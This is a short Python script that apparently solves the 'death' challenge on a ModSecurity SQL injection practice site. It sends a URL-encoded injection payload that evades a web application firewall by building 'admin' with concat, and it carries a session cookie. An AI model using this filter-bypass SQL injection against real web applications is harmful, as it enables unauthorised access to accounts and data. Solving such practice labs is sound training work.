import requests

url = "https://modsec.rubiya.kr/chall/death_0128e8a86066ca4f148444f0e99f4707.php?"
cookie = {'PHPSESSID':'s93536osgfmtdaqp4b5lpnt7p9'}

def solve():
    query = "id=%27%3C%40%3D1%20or%20id%3Dconcat(%27a%27%2C%27dmin%27)--%20"
    res = requests.get(url=url+query,cookies=cookie)
    if "DEATH Clear!" in res.text:
        print("DEATH Clear!")

if __name__ == "__main__":
    solve()